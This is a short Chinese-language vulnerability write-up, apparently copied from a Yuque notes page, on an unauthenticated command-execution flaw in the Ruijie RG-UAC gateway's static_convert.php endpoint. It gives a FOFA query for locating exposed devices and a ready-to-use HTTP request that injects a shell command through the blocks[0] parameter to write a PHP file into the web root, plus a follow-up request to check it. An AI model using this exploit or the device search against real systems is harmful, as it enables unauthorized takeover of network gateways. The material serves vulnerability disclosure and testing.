# 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞

### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关static_convert.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：

![1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115.png](./img/Q8lxrxaSC9nu8f0u/1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115-439134.png)

### 四、漏洞复现
```java
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20echo%20md5("666");unlink(__FILE__);?>%27%20>/var/www/html/ceshi.php HTTP/1.1
Host:
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1718990706166-fc93cf5e-ef51-4a13-b3dd-ca7d657fbc41.png](./img/Q8lxrxaSC9nu8f0u/1718990706166-fc93cf5e-ef51-4a13-b3dd-ca7d657fbc41-942982.png)

```java
GET /ceshi.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1718990752914-a4154066-0057-4a6c-9bdb-53d9f30aebf0.png](./img/Q8lxrxaSC9nu8f0u/1718990752914-a4154066-0057-4a6c-9bdb-53d9f30aebf0-266952.png)









> 更新: 2024-06-24 11:42:29  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ofaghdl3fyqnfsf3>